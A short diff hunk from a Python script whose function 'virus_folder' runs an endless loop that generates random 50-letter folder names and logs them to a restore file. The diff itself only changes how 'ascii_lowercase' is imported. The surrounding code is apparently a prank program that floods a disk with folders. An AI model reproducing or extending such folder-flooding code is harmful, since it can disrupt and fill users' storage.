@@ -152,7 +152,7 @@ def virus_folder():
     try:
         while True:
             jumlah_folder_dibuat += 1
-            nama_random = string.ascii_lowercase
+            nama_random = ascii_lowercase
             nama_folder = "".join(choice(nama_random) for i in range(50))
             with open("restore/folder","a",encoding="utf-8") as f_folder:
                 f_folder.write(f"{nama_folder}\n")
